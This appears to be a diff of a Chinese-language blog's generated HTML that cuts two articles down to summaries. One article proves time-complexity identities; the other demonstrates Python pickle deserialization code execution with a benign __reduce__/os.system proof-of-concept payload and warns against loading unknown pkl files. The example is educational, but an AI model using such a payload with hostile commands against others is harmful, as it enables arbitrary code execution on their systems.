@@ -158,97 +158,25 @@
     </div>
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="0x01-证明-O-f-O-g-O-f-g"><a href="#0x01-证明-O-f-O-g-O-f-g" class="headerlink" title="0x01 证明$O(f)+O(g) = O(f+g)$"></a>0x01 证明$O(f)+O(g) = O(f+g)$</h1><p>令$F(n)=O(f)$，则存在自然数$n_1$、正数$c_1$，使得任意自然数$n\geq n_1$，有：</p>
-<ul>
-<li>$F(n)\leq c_1f(n)$</li>
-</ul>
-<p>同理，令$G(n)=O(g)$，存在自然数$n_2$，正数$c_2$，使得对任意自然数$n\geq n_2$，有：</p>
-<ul>
-<li>$G(n)\leq c_2g(n)$</li>
-</ul>
-<p>令$c_3=max(c_1,c_2)$，$n_3=max(n_1,n_2)$，则对所有的$n\geq  n_3$，有：</p>
-<ul>
-<li>$F(n)\leq c_1f(n)\leq c_3f(n)$</li>
-<li>$G(n)\leq c_2g(n) \leq c_3g(n)$</li>
-</ul>
-<p>故：</p>
-<ul>
-<li>$O(f)+O(g)=f(n)+g(n)\leq c_3f(n)+c_3g(n)=c_3(f(n)+g(n))=O(f+g)$</li>
-</ul>
-<h1 id="0x02-证明-theta-f-theta-g-theta-f-g"><a href="#0x02-证明-theta-f-theta-g-theta-f-g" class="headerlink" title="0x02 证明$\theta(f)+\theta(g) = \theta(f+g)$"></a>0x02 证明$\theta(f)+\theta(g) = \theta(f+g)$</h1><p>令$F(n)=\theta (f)$，则存在自然数$n_1$和正数$c_1$、$c_2$，使得任意自然数$n\geq n_1$，有：</p>
-<ul>
-<li>$c_1f(n)\leq F(n)\leq c_2f(n)$</li>
-</ul>
-<p>同理，令$G(n)=\theta (g)$，存在自然数$n_2$和正数$c_3$、$c_4$，使得对任意自然数$n\geq n_2$，有：</p>
-<ul>
-<li>$c_3g(n)\leq G(n)\leq c_4g(n)$</li>
-</ul>
-<p>得：</p>
-<ul>
-<li>$c_1 f(n)+c_3 g(n) \leq F(n) + G(n) \leq c_2 f(n) + c_4 g(n)$</li>
-</ul>
-<p>存在$c_1=c_3$、$c_2=c_4$，使得：</p>
-<ul>
-<li>$c_1 (f(n)+g(n)) \leq F(n) + G(n) \leq c_2 (f(n) + g(n))$</li>
-</ul>
-<p>即得证。</p>
-<h1 id="0x03-证明-max-theta-f-theta-g-theta-f-g"><a href="#0x03-证明-max-theta-f-theta-g-theta-f-g" class="headerlink" title="0x03 证明$max(\theta (f),\theta (g))=\theta (f+g)$"></a>0x03 证明$max(\theta (f),\theta (g))=\theta (f+g)$</h1><p>网上看到的一些类似证明，我觉得都不是很合理，可能本人智商欠费的原因QAQ</p>
-<p>令$F(n)=\theta (f)$，则存在自然数$n_1$和正数$c_1$、$c_2$，使得任意自然数$n\geq n_1$，有：</p>
-<ul>
-<li>$c_1f(n)\leq F(n)\leq c_2f(n)$</li>
-</ul>
-<p>同理，令$G(n)=\theta (g)$，存在自然数$n_2$和正数$c_3$、$c_4$，使得对任意自然数$n\geq n_2$，有：</p>
-<ul>
-<li>$c_3g(n)\leq G(n)\leq c_4g(n)$</li>
-</ul>
-<p>得：</p>
-<ul>
-<li>$c_1 f(n)+c_3 g(n) \leq F(n) + G(n) \leq c_2 f(n) + c_4 g(n)$</li>
-</ul>
-<p>存在$c_1=c_3$、$c_2=c_4$，使得：</p>
-<ul>
-<li>$c_1 (f(n)+g(n)) \leq F(n) + G(n) \leq c_2 (f(n) + g(n))$</li>
-</ul>
-<p>显然的</p>
-<ul>
-<li>$c_1 (f(n)+g(n)) \leq max(F(n), G(n)) \leq F(n) + G(n) \leq c_2 (f(n) + g(n))$</li>
-</ul>
-<p>这里$c_1$取$\frac {1}{2}$即可。</p>
-<h1 id="0x04-证明-theta-f-cdot-theta-g-theta-f-cdot-g"><a href="#0x04-证明-theta-f-cdot-theta-g-theta-f-cdot-g" class="headerlink" title="0x04 证明$\theta(f)\cdot \theta(g) = \theta(f\cdot g)$"></a>0x04 证明$\theta(f)\cdot \theta(g) = \theta(f\cdot g)$</h1><p>令$F(n)=\theta (f)$，则存在自然数$n_1$和正数$c_1$、$c_2$，使得任意自然数$n\geq n_1$，有：</p>
-<ul>
-<li>$c_1f(n)\leq F(n)\leq c_2f(n)$</li>
-</ul>
-<p>同理，令$G(n)=\theta (g)$，存在自然数$n_2$和正数$c_3$、$c_4$，使得对任意自然数$n\geq n_2$，有：</p>
-<ul>
-<li>$c_3g(n)\leq G(n)\leq c_4g(n)$</li>
-</ul>
-<p>得：</p>
-<ul>
-<li>$c_1 f(n)\cdot c_3 g(n) \leq F(n) \cdot  G(n) \leq c_2 f(n) \cdot  c_4 g(n)$</li>
-</ul>
-<p>即得证。</p>
-<h1 id="0x05-证明-theta-max-f-n-g-n-theta-f-g"><a href="#0x05-证明-theta-max-f-n-g-n-theta-f-g" class="headerlink" title="0x05 证明$\theta(max(f(n), g(n)))=\theta (f+g)$"></a>0x05 证明$\theta(max(f(n), g(n)))=\theta (f+g)$</h1><p>令$F(n)=\theta (f)$，则存在自然数$n_1$和正数$c_1$、$c_2$，使得任意自然数$n\geq n_1$，有：</p>
-<ul>
-<li>$c_1f(n)\leq F(n)\leq c_2f(n)$</li>
-</ul>
-<p>同理，令$G(n)=\theta (g)$，存在自然数$n_2$和正数$c_3$、$c_4$，使得对任意自然数$n\geq n_2$，有：</p>
-<ul>
-<li>$c_3g(n)\leq G(n)\leq c_4g(n)$</li>
-</ul>
-<p>得：</p>
-<ul>
-<li>$c_1 f(n)+c_3 g(n) \leq F(n) + G(n) \leq c_2 f(n) + c_4 g(n)$</li>
-</ul>
-<p>存在$c_1=c_3$、$c_2=c_4$，使得：</p>
-<ul>
-<li>$c_1 (f(n)+g(n)) \leq F(n) + G(n) \leq c_2 (f(n) + g(n))$</li>
-</ul>
-<p>显然的</p>
-<ul>
-<li>$c_1 (f(n)+g(n)) \leq \theta(max(f(n), g(n))) \leq F(n) + G(n) \leq c_2 (f(n) + g(n))$</li>
-</ul>
-<p>这里$c_1​$取$\frac {1}{2}​$即可。</p>
+        
 
+          
+          <div class="entry-summary">
+          0x01 证明$O(f)+O(g) = O(f+g)$令$F(n)=O(f)$，则存在自然数$n_1$、正数$c_1$，使得任意自然数$n\geq n_1$，有：
+
+$F(n)\leq c_1f(n)$
+
+同理，令$G(n)=O(g)$，存在自然数$n_2$，正数$c_2$，使得对任意自然数$n\geq n_2$，有：
+
+$G(n)\leq c_2g(n)$
+
+令$c_3=max(c_1,c_2)$，$n_3=max(n_1,n_2)$，则对所有的$n\geq  n_3$，有：
+
+        
+          <p class="article-more-link">
+            <a href="/2018/03/01/2018-03-01-关于时间复杂度的几个典型证明/#more">阅读全文</a>
+          </p>
+        </div>
       
     </div>
     <footer class="entry-meta entry-footer">
@@ -298,21 +226,19 @@
     </div>
     <div class="article-entry" itemprop="articleBody">
       
-        <p>我们通常使用pickle将python对象序列化，但是pickle在加载时有一个副作用就是它会自动加载相应模块并构造实例对象。这样就造成了一个很危险的代码，如果被黑客利用的话会造成非常严重的后果。</p>
-<p>我首先在python2.7下测试，通过如下代码生成<code>payload</code></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">gen</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">        s = <span class="string">"""echo test &gt; payload.txt"""</span> </span><br><span class="line">        <span class="keyword">return</span> os.system, (s,)        </span><br><span class="line"></span><br><span class="line">p = gen()</span><br><span class="line">payload = pickle.dumps(p)</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'payload.pkl'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(payload)</span><br></pre></td></tr></table></figure>
-<p>输出的<code>payload</code>是这样的</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cnt</span><br><span class="line">system</span><br><span class="line">p1</span><br><span class="line">(S<span class="string">'echo test &gt; payload.txt'</span></span><br><span class="line">p2</span><br><span class="line">tRp3</span><br><span class="line">.</span><br></pre></td></tr></table></figure>
-<p>我们通过如下代码去执行<code>payload</code></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line">pickle.load(open(<span class="string">'./payload.pkl'</span>))</span><br></pre></td></tr></table></figure>
-<p>通过执行上面这个代码，我们在相同文件夹下生成了<code>payload.txt</code>文件，并且内容是<code>test</code>。</p>
-<p>接着我们将上面的测试放到python3.6下面，通过和python2.7下面相同的代码生成payload</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">€cnt</span><br><span class="line">system</span><br><span class="line">q X   echo test &gt; payload.txtq卶Rq.</span><br></pre></td></tr></table></figure>
-<p>我们通过如下代码去执行<code>payload</code></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line">pickle.load(open(<span class="string">'./payload.pkl'</span>, <span class="string">'rb'</span>))</span><br></pre></td></tr></table></figure>
-<p>通过执行上面这个代码，我们得到了和python2.7下面相同的结果。</p>
-<p>也就是说，只要在我们编写的代码中有打开<code>pkl</code>文件操作的代码存在的话，那么都会出现上述的问题。你可以想象到，这是多么危险的一件事情。所以这就要求我们在编写，不要随便打开不知名的<code>pkl</code>文件。</p>
+        
 
+          
+          <div class="entry-summary">
+          我们通常使用pickle将python对象序列化，但是pickle在加载时有一个副作用就是它会自动加载相应模块并构造实例对象。这样就造成了一个很危险的代码，如果被黑客利用的话会造成非常严重的后果。
+我首先在python2.7下测试，通过如下代码生成payload
+1234567891011import pickleimport osclass gen(object):    def __reduce__(self):        s = """echo test &gt; payload.txt"""         return os.system, (s,)        p = gen()payload = pickle.dumps(p)with open('payload.pkl', 'wb') as f:    f.write(payload)
+
+        
+          <p class="article-more-link">
+            <a href="/2018/02/21/2018-02-21-Python-Pickle任意代码执行漏洞/#more">阅读全文</a>
+          </p>
+        </div>
       
     </div>
     <footer class="entry-meta entry-footer">
